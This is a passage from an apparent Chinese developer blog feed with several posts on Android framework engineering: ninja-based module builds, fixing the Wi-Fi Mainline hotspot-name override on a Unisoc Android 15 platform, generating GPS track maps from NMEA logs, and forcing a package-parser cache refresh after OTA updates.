<code>framework/native/services</code> 下的文件，可以通过在同级或上级目录中的Android.bp文件内容中查找修改的文件名字或具体目录，来找到所属sources，再逐级向上找到被编译进哪个“name”的目标产物xxx中，再 <code>make xxx -j32</code> 对其编译。</li><li>如果xxx编译出的产物是中间产物或手机中没有的无法替换的产物可以再向上查找更大name的目标产物xxxx（如：cc_library_shared、cc_library、java_library、apex_available等）进行编译或直接push进system/lib和system/lib64重启。</li></ul><h3 id="6-编译system-img"><a href="#6-编译system-img" class="headerlink" title="6. 编译system.img"></a>6. 编译system.img</h3><ul><li>当你确定修改的内容能在编译system.img时带入，可以使用 <code>make systemimage -j16</code> 编译。通过进入fastboot模式后刷system.img进行生效。</li></ul><h3 id="编译调试注意点"><a href="#编译调试注意点" class="headerlink" title="编译调试注意点"></a>编译调试注意点</h3><ol><li>编译最好把已经生成的先删掉，不然有可能文件不更新（push前check下文件的生成时间）。</li><li>编译终端最后提示的生成路径不一定是唯一生成路径，同级目录、对称lib或lib64目录里可能都有你需要的生成物。library要把生成的库文件在system/lib和system/lib64下都做相应的push。</li><li>如果是push替换库文件，最好留一个原本的备份避免push了开不了机器。</li><li>编译调试的时候如果是自己陌生的模块，建议每次都加行特殊log以确认自己的修改已经生效。</li></ol><h2 id="二、使用ninja替代make进行快速编译"><a href="#二、使用ninja替代make进行快速编译" class="headerlink" title="二、使用ninja替代make进行快速编译"></a>二、使用ninja替代make进行快速编译</h2><h3 id="为什么要使用ninja？"><a href="#为什么要使用ninja？" class="headerlink" title="为什么要使用ninja？"></a>为什么要使用ninja？</h3><p>通常使用make编译会有两个阶段：</p><ol><li>先分析Android.bp，将所有需要参与编译的文件的路径都记录下，writing build rules并打包到 <code>out/soong/combined-.ninja</code> 中。（普遍耗时15-20min）</li><li>然后ninja工具通过第一步生成的文件，编译要编译的模块。（不同模块速度不同，比如services模块只需要大约20s）</li></ol><p><strong>优点</strong>：直接使用ninja就可以省去第一部分耗时，尤其在反复编译时调试效率提高。</p><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><ol><li>进行ninja之前必须要先make一次（当然要想make必须先根目录source和lunch一次），以生成路径文件；如果你的修改增删了模块中文件的名字路径，就必须重新make生成路径文件。</li></ol><h3 id="ninja的获取"><a href="#ninja的获取" class="headerlink" title="ninja的获取"></a>ninja的获取</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span>到android系统源码的根目录下，执行</span><br><span class="line"><span class="built_in">cp</span> prebuilts/build-tools/linux-x86/bin/ninja out/host/linux-x86/bin/</span><br><span class="line"><span class="built_in">cp</span> prebuilts/build-tools/linux-x86/bin/ninja /usr/local/bin/</span><br><span class="line"><span class="built_in">cp</span> prebuilts/build-tools/linux-x86/bin/ninja /usr/bin/</span><br><span class="line"><span class="built_in">ln</span> -sf out/combined-***.ninja build.ninja</span><br></pre></td></tr></table></figure><h3 id="ninja文件内容"><a href="#ninja文件内容" class="headerlink" title="ninja文件内容"></a>ninja文件内容</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="function"><span class="title">ninja</span></span>()&#123;</span><br><span class="line"> ninja_bin=<span class="string">&quot;<span class="variable">$ANDROID_BUILD_TOP</span>/prebuilts/build-tools/linux-x86/bin/ninja&quot;</span></span><br><span class="line"> ninja_build_file=<span class="string">&quot;<span class="variable">$ANDROID_BUILD_TOP</span>/out/combined-<span class="variable">$TARGET_PRODUCT</span>.ninja&quot;</span></span><br><span class="line"> <span class="keyword">if</span> [ ! -f <span class="variable">$ninja_build_file</span> ]</span><br><span class="line"> <span class="keyword">then</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;can&#x27;t find ninja buildfile <span class="variable">$ninja_build_file</span>&quot;</span></span><br><span class="line"> <span class="built_in">exit</span> -1</span><br><span class="line"> <span class="keyword">fi</span></span><br><span class="line"> <span class="keyword">if</span> [ ! -f <span class="variable">$ninja_bin</span> ]</span><br><span class="line"> <span class="keyword">then</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;can&#x27;t find ninja binary <span class="variable">$ninja_bin</span>&quot;</span></span><br><span class="line"> <span class="built_in">exit</span> -1</span><br><span class="line"> <span class="keyword">fi</span></span><br><span class="line"> <span class="variable">$ninja_bin</span> -f <span class="variable">$ninja_build_file</span> <span class="variable">$1</span></span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">#usage:ninja&lt;modulename&gt;</span></span><br><span class="line">ninja $*</span><br></pre></td></tr></table></figure><h3 id="ninja的执行"><a href="#ninja的执行" class="headerlink" title="ninja的执行"></a>ninja的执行</h3><p>如果执行ninja进行快速编译时，遇到如下错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ninja: error <span class="keyword">while</span> loading shared libraries: libjemalloc5.so: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure><p>使用如下解决方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">cp</span> prebuilts/build-tools/linux-x86/lib64/libjemalloc5.so /usr/lib</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
            <tag> build </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>展锐平台(Android15)WLAN热点名称修改不生效问题分析</title>
      <link href="/2025/06/28/2025-06-28/"/>
      <url>/2025/06/28/2025-06-28/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在展锐Android V项目开发中，需要修改softAp/P2P热点名称时，发现集成GMS后直接修改framework层代码无效。具体表现为：</p><ul><li>修改<code>packages/modules/Wifi/WifiApConfigStore</code>中的<code>getDefaultApConfiguration</code>方法</li><li>编译烧录后修改不生效</li></ul><p><img src="/images/20250628/Screenshot_20250704-125018.png" alt="Wi-Fi配置界面"></p><p>问题根源在于：<strong>Wi-Fi模块在Android S(12)及以上版本已纳入Mainline模块</strong></p><h2 id="Mainline模块机制解析"><a href="#Mainline模块机制解析" class="headerlink" title="Mainline模块机制解析"></a>Mainline模块机制解析</h2><h3 id="什么是Mainline？"><a href="#什么是Mainline？" class="headerlink" title="什么是Mainline？"></a>什么是Mainline？</h3><p>Google将部分核心模块独立开发维护，这些模块会随系统更新单独升级，不再依赖AOSP版本迭代。这导致：</p><ul><li>修改本地代码会被系统预置模块覆盖</li><li>整编时无法打包修改后的模块</li></ul><h3 id="受影响模块列表"><a href="#受影响模块列表" class="headerlink" title="受影响模块列表"></a>受影响模块列表</h3><p>参考Google官方文档：<a href="https://source.android.com/docs/core/architecture/modular-system?hl=zh-cn">模块化系统架构</a></p><p><img src="/images/20250628/2025_07_05T07_00_55_183.png" alt="Mainline模块时间轴"><br><em>Wi-Fi模块自Android 11开始Mainline化</em></p><h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><h3 id="修改失效原因"><a href="#修改失效原因" class="headerlink" title="修改失效原因"></a>修改失效原因</h3><ol><li><strong>代码覆盖</strong>：Mainline模块优先级高于本地修改</li><li><strong>编译机制</strong>：GMS版本会强制使用预置模块</li><li><strong>认证限制</strong>：关闭Mainline会影响GTS测试</li></ol><h3 id="解决方案矩阵"><a href="#解决方案矩阵" class="headerlink" title="解决方案矩阵"></a>解决方案矩阵</h3><table><thead><tr><th>方案</th><th>适用场景</th><th>限制条件</th></tr></thead><tbody><tr><td>Overlay机制</td><td>修改配置参数</td><td>需展锐平台支持</td></tr><tr><td>运行时设置</td><td>动态修改热点名</td><td>需处理冲突逻辑</td></tr><tr><td>关闭Mainline</td><td>仅限国内版本</td><td>影响GMS认证</td></tr></tbody></table><h2 id="具体解决方案"><a href="#具体解决方案" class="headerlink" title="具体解决方案"></a>具体解决方案</h2><h3 id="方案1：使用Overlay机制（推荐）"><a href="#方案1：使用Overlay机制（推荐）" class="headerlink" title="方案1：使用Overlay机制（推荐）"></a>方案1：使用Overlay机制（推荐）</h3><p>展锐平台已提供Overlay配置入口：<br><strong>vendor/sprd/platform/frameworks/opt/net/wifi/service/ServiceUniWifiResources/res/values/config.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;config_wifi_softap_ssid&quot;</span>&gt;</span>custom<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;config_wifi_p2p_device_name&quot;</span>&gt;</span>MyP2PName<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="方案2：运行时动态设置"><a href="#方案2：运行时动态设置" class="headerlink" title="方案2：运行时动态设置"></a>方案2：运行时动态设置</h3><p>通过系统广播监听实现首次启动配置：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 监听BOOT_COMPLETED广播</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HotspotInitializer</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PREF_HOTSPOT_SET</span> <span class="operator">=</span> <span class="string">&quot;hotspot_initialized&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (isAlreadyConfigured(context)) <span class="keyword">return</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="type">WifiManager</span> <span class="variable">wifiManager</span> <span class="operator">=</span> (WifiManager) context.getSystemService(Context.WIFI_SERVICE);</span><br><span class="line">        <span class="type">SoftApConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> wifiManager.getSoftApConfiguration();</span><br><span class="line">        <span class="type">String</span> <span class="variable">newSsid</span> <span class="operator">=</span> SystemProperties.get(<span class="string">&quot;ro.product.model&quot;</span>) + <span class="string">&quot;_HOTSPOT&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        wifiManager.setSoftApConfiguration(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">SoftApConfiguration</span>.Builder(config)</span><br><span class="line">                .setSsid(newSsid)</span><br><span class="line">                .build()</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        markAsConfigured(context);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isAlreadyConfigured</span><span class="params">(Context ctx)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> PreferenceManager.getDefaultSharedPreferences(ctx)</span><br><span class="line">            .getBoolean(PREF_HOTSPOT_SET, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键点：</p><ol><li>使用SharedPreferences记录配置状态</li><li>通过系统属性获取设备型号作为SSID基础</li><li>需在AndroidManifest.xml中注册广播接收器</li></ol><h3 id="方案3：关闭Mainline模块（仅限国内版本）"><a href="#方案3：关闭Mainline模块（仅限国内版本）" class="headerlink" title="方案3：关闭Mainline模块（仅限国内版本）"></a>方案3：关闭Mainline模块（仅限国内版本）</h3><p>在BoardConfig.mk中添加：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭Wi-Fi Mainline模块（影响GTS测试）</span></span><br><span class="line">MAINLINE_INCLUDE_WIFI_MODULE := false</span><br></pre></td></tr></table></figure><p>风险提示：</p><ul><li>可能导致GMS认证失败</li><li>无法接收Wi-Fi模块安全更新</li><li>仅建议在非GMS版本或测试环境使用</li></ul><p><img src="/images/20250628/Screenshot_20250704-125118.png"></p><h2 id="总结与建议"><a href="#总结与建议" class="headerlink" title="总结与建议"></a>总结与建议</h2><ol><li>优先方案：使用Overlay机制（方案1），这是最安全合规的方式</li><li>备选方案：运行时设置（方案2），需处理好配置冲突</li><li>最后手段：关闭Mainline（方案3），仅限特定场景使用</li></ol><p>对于GMS认证设备，建议采用方案1+方案2组合：</p><ul><li>使用Overlay设置默认值</li><li>通过运行时机制允许用户自定义</li><li>保留系统设置入口作为最终配置渠道</li></ul><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>附上Android15上测试可用的修改方法:<br><strong>vendor/sprd/platform/packages/app/UniWifi/app/res/values/config.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">&lt;!-- Carrier default softap ssid via IMEI, like as 1234, name1, name2 --&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string-array</span> <span class="attr">translatable</span>=<span class="string">&quot;false&quot;</span> <span class="attr">name</span>=<span class="string">&quot;config_uniwifi_softap_default_ssid_via_imei&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">string-array</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!-- Customer default softap ssid --&gt;</span></span><br><span class="line">-    <span class="tag">&lt;<span class="name">string</span> <span class="attr">translatable</span>=<span class="string">&quot;false&quot;</span> <span class="attr">name</span>=<span class="string">&quot;config_uniwifi_softap_default_ssid&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">+    <span class="tag">&lt;<span class="name">string</span> <span class="attr">translatable</span>=<span class="string">&quot;false&quot;</span> <span class="attr">name</span>=<span class="string">&quot;config_uniwifi_softap_default_ssid&quot;</span>&gt;</span>custom<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">     <span class="comment">&lt;!-- Preset Carrier Network as Suggestion according to software version --&gt;</span></span><br><span class="line">     <span class="comment">&lt;!-- ro.carrier, ssid, eap type(WifiConfiguration.SECURITY_TYPE#3-5-9),</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
            <tag> Wifi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用NMEA Tools生成GPS轨迹图</title>
      <link href="/2025/03/02/2025-03-02/"/>
      <url>/2025/03/02/2025-03-02/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在现代科技快速发展的时代，GPS定位技术已经广泛应用于各种领域，如导航、物流、运动追踪等。为了获取和分析GPS数据，我们常常需要使用一些专业的工具。本文将详细介绍如何使用一款名为“NMEA Tools”的APK应用，结合GPSVisualizer网站，来生成GPS轨迹图。无论你是科研人员、户外运动爱好者，还是需要对GPS数据进行处理的专业人士，本文都将为你提供一份详尽的操作指南</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h4 id="1-安装APK"><a href="#1-安装APK" class="headerlink" title="1.安装APK"></a>1.安装APK</h4><p>1 <strong>下载APK：</strong> 首先，你需要找到并下载“NMEA Tools”这款应用的APK文件。你可以在各大APK下载网站搜索到它，或者直接到Google Play商店搜索并下载安装。</p><h4 id="2-使用APK"><a href="#2-使用APK" class="headerlink" title="2.使用APK"></a>2.使用APK</h4><p>1 <strong>安装并打开应用：</strong> 将下载的APK文件安装到你的测试手机上，并打开应用。</p><p><img src="/images/20250302/20250226113343.png"></p><p><img src="/images/20250302/20250226113401.png"></p><p>2 <strong>权限确认：</strong> 点击“NMEA 记录仪”按钮后，应用会请求多次权限确认，包括位置信息、存储权限等。请确保你同意所有必要的权限请求，以便应用能够正常工作。</p><p><img src="/images/20250302/20250226113413.png"></p><p>3 <strong>进入记录器页面：</strong> 权限确认完成后，你将进入记录器页面。</p><p><img src="/images/20250302/20250226113446.png"></p><p>4 <strong>开始记录：</strong> 点击底部的“记录 0”按钮，此时手机将开始定位。请移动手机以记录不同位置的GPS数据。</p><p>5 <strong>结束记录并保存：</strong> 测试完成后，同样点击底部的“记录”按钮，然后点击“储存”按钮以保存记录的数据。</p><p><img src="/images/20250302/20250226114658.png"></p><p>6 <strong>查看历史记录：</strong> 回到应用主界面，点击“历史记录”按钮以查看之前保存的记录。</p><p><img src="/images/20250302/20250226114722.png"><br><img src="/images/20250302/20250226114735.png"></p><p>7 <strong>选择并浏览记录：</strong> 根据时间选择对应的记录，然后点击“NMEA浏览器”按钮以查看详细的NMEA数据。</p><p><img src="/images/20250302/20250226114749.png"></p><p>8 <strong>下载NMEA数据：</strong> 点击底部按钮，选择下载操作以将NMEA数据保存为txt文件。</p><p><img src="/images/20250302/20250226114809.png"></p><p>9 <strong>命名并保存文件：</strong> 选择保存路径，并为文件名称添加前缀以区分机型，例如“pixel_”。</p><p><img src="/images/20250302/20250226114833.png"></p><h4 id="3-手机连接电脑"><a href="#3-手机连接电脑" class="headerlink" title="3.手机连接电脑"></a>3.手机连接电脑</h4><p>1 <strong>连接手机与电脑：</strong> 将手机通过USB线连接到电脑，并将刚才保存的txt文件传输到电脑的任意位置。</p><h4 id="4-生成轨迹图"><a href="#4-生成轨迹图" class="headerlink" title="4.生成轨迹图"></a>4.生成轨迹图</h4><p>1 <strong>访问GPSVisualizer网站：</strong> 打开浏览器，访问<a href="https://www.gpsvisualizer.com/map_input">https://www.gpsvisualizer.com/map_input</a>网站。</p><p><img src="/images/20250302/20250226115138.png"></p><p>2 <strong>上传txt文件：</strong> 点击“浏览”按钮，选择对应的txt文件并上传到服务器。</p><p><img src="/images/20250302/20250226115207.png"></p><p>3 <strong>生成轨迹图：</strong> 点击“Draw the map”按钮，网站将根据你的NMEA数据生成GPS轨迹图。</p><p><img src="/images/20250302/20250226115832.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过一步步跟随本文的指引，你现在已经掌握了生成GPS轨迹图的技巧。这一方法不仅操作简便，而且能够为你提供详尽、直观的GPS数据可视化结果，无论是科研探索、户外运动追踪，还是其他需要精确GPS数据支持的领域，这一技能都将为你带来极大的便利。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 测试 </tag>
            
            <tag> GPS轨迹图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android PMS缓存刷新机制优化：实现OTA升级后应用缓存更新</title>
      <link href="/2025/02/02/2025-02-02/"/>
      <url>/2025/02/02/2025-02-02/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在Android设备的OTA（Over-The-Air）升级过程中，有时会遇到应用未能及时更新的问题。具体表现为，升级后新内置应用不出现，或者应用版本未发生变化，需要用户恢复出厂设置才能正常显示新版本。这种情况往往是由于系统缓存未得到正确刷新导致的。为了解决这个问题，本文提供了一种通过修改系统源代码来强制刷新缓存的方法。</p><h2 id="PackageManagerService-java"><a href="#PackageManagerService-java" class="headerlink" title="PackageManagerService.java"></a>PackageManagerService.java</h2><p>在Android系统的源代码中，PackageManagerService.java是负责应用包管理的核心服务类。<br><strong>frameworks/base/services/core/java/com/android/server/pm/PackageManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">PackageManagerService</span><span class="params">(PackageManagerServiceInjector injector, <span class="type">boolean</span> factoryTest,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> String partitionsFingerprint, <span class="keyword">final</span> <span class="type">boolean</span> isEngBuild,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> <span class="type">boolean</span> isUserDebugBuild, <span class="keyword">final</span> <span class="type">int</span> sdkVersion, <span class="keyword">final</span> String incrementalVersion)</span> &#123;</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Bug 2258844 - add debug log or trace for PKMS(3/6)</span></span><br><span class="line">            t.traceBegin(<span class="string">&quot;prepare package parser cache&quot;</span>);</span><br><span class="line">            <span class="comment">// 准备包解析器缓存目录，该目录的命名与设备的构建fingerprint有关</span></span><br><span class="line">            mCacheDir = PackageManagerServiceUtils.preparePackageParserCache(</span><br><span class="line">                    mIsEngBuild, mIsUserDebugBuild, mIncrementalVersion);</span><br><span class="line">            <span class="comment">// Bug 2258844 - add debug log or trace for PKMS(4/6)</span></span><br><span class="line">            t.traceEnd();</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是，由于某些国内版本的Android设备在通过GMS（Google Mobile Services）认证后仍然需要修改系统版本信息以避免被谷歌发现，因此这些设备会将构建指纹（fingerprint）锁定。PackageManagerService（PMS）在每次开机时会根据这个指纹值在 <strong>/data/system/package_cache</strong> 目录下查找对应的缓存目录。在userdebug版本中，这个目录的名称通常为“1”，而在正常版本中，它是通过SystemProperties.digestOf(“ro.build.fingerprint”)生成的。</p><p><img src="/images/20250202/20250219104138.png"></p><p>正常ota升级的话这个值会变，所以会清空之前的缓存，使用新生成的目录，需要做如下特殊操作使系统在升级完ota后去更新缓存目录</p><h2 id="修改PackageManagerServiceUtils-java以实现缓存刷新"><a href="#修改PackageManagerServiceUtils-java以实现缓存刷新" class="headerlink" title="修改PackageManagerServiceUtils.java以实现缓存刷新"></a>修改PackageManagerServiceUtils.java以实现缓存刷新</h2><p><strong>frameworks/base/services/core/java/com/android/server/pm/PackageManagerServiceUtils.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="meta">@Nullable</span> File <span class="title function_">preparePackageParserCache</span><span class="params">(<span class="type">boolean</span> forEngBuild,</span></span><br><span class="line"><span class="params">            <span class="type">boolean</span> isUserDebugBuild, String incrementalVersion)</span> &#123;</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The base directory for the package parser cache lives under /data/system/.</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">File</span> <span class="variable">cacheBaseDir</span> <span class="operator">=</span> Environment.getPackageCacheDirectory();</span><br><span class="line">    <span class="keyword">if</span> (!FileUtils.createDir(cacheBaseDir)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// There are several items that need to be combined together to safely</span></span><br><span class="line">    <span class="comment">// identify cached items. In particular, changing the value of certain</span></span><br><span class="line">    <span class="comment">// feature flags should cause us to invalidate any caches.</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">cacheName</span> <span class="operator">=</span> FORCE_PACKAGE_PARSED_CACHE_ENABLED ? <span class="string">&quot;debug&quot;</span></span><br><span class="line">            : SystemProperties.digestOf(<span class="string">&quot;ro.build.fingerprint&quot;</span>);<span class="comment">//文件夹的名称是通过这个生成的</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Reconcile cache directories, keeping only what we&#x27;d actually use.</span></span><br><span class="line">    <span class="keyword">for</span> (File cacheDir : FileUtils.listFilesOrEmpty(cacheBaseDir)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Objects.equals(cacheName, cacheDir.getName())) &#123;<span class="comment">//boyin </span></span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span>(SystemProperties.get(<span class="string">&quot;persist.sys.ota_done&quot;</span>,<span class="string">&quot;0&quot;</span>).equals(<span class="string">&quot;1&quot;</span>))&#123;<span class="comment">//添加标志位，需要对ota升级应用做修改，在升级成功后把这个标志位置为1</span></span><br><span class="line">                FileUtils.deleteContentsAndDir(cacheDir);</span><br><span class="line">                SystemProperties.set(<span class="string">&quot;persist.sys.ota_done&quot;</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line">                Slog.d(TAG, <span class="string">&quot;delete known cache ,升级成功:&quot;</span> + cacheDir.getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Slog.d(TAG, <span class="string">&quot;Keeping known cache &quot;</span> + cacheDir.getName());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Slog.d(TAG, <span class="string">&quot;Destroying unknown cache &quot;</span> + cacheDir.getName());</span><br><span class="line">            FileUtils.deleteContentsAndDir(cacheDir);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个修改中，我们添加了一个标志位 <strong>persist.sys.ota_done</strong> 。在OTA升级成功后，我们需要将这个标志位设置为1。然后，在下次系统启动时， <strong>PackageManagerServiceUtils.preparePackageParserCache</strong> 方法会检查这个标志位。如果标志位为1，它会删除当前的缓存目录及其内容，并重置标志位为0。这样，系统就会使用新的缓存目录，从而确保应用能够得到及时更新。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
            <tag> androidmk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android mk文件中&#39;TARGET_OUT&#39;的路径分析</title>
      <link href="/2025/02/01/2025-02-01/"/>
      <url>/2025/02/01/2025-02-01/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在 Android 源码的编译系统中，<code>TARGET_OUT</code> 是一个核心变量，用于指向编译生成的系统镜像的最终输出路径。本文将通过分析 <code>build/core/envsetup.mk</code> 文件中的变量定义，详细解析 <code>TARGET_OUT</code> 的指向路径及其相关的变量链。</p><hr><h2 id="1-TARGET-OUT-的定义"><a href="#1-TARGET-OUT-的定义" class="headerlink" title="1. TARGET_OUT 的定义"></a>1. <code>TARGET_OUT</code> 的定义</h2><p><code>TARGET_OUT</code> 的定义如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TARGET_OUT := <span class="variable">$(PRODUCT_OUT)</span>/<span class="variable">$(TARGET_COPY_OUT_SYSTEM)</span></span><br></pre></td></tr></table></figure><p>这里，TARGET_OUT 是由两个变量组合而成的：</p><ul><li><strong>PRODUCT_OUT</strong>：指向产品输出的根目录。</li><li><strong>TARGET_COPY_OUT_SYSTEM</strong>：表示系统目录的名称，通常为 <strong>system</strong>。</li></ul><p>因此，<strong>TARGET_OUT</strong> 的最终路径是 <strong>$(PRODUCT_OUT)/system</strong> 。</p><hr><h2 id="2-PRODUCT-OUT-的定义"><a href="#2-PRODUCT-OUT-的定义" class="headerlink" title="2. PRODUCT_OUT 的定义"></a>2. PRODUCT_OUT 的定义</h2><p><strong>PRODUCT_OUT</strong> 的定义如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span 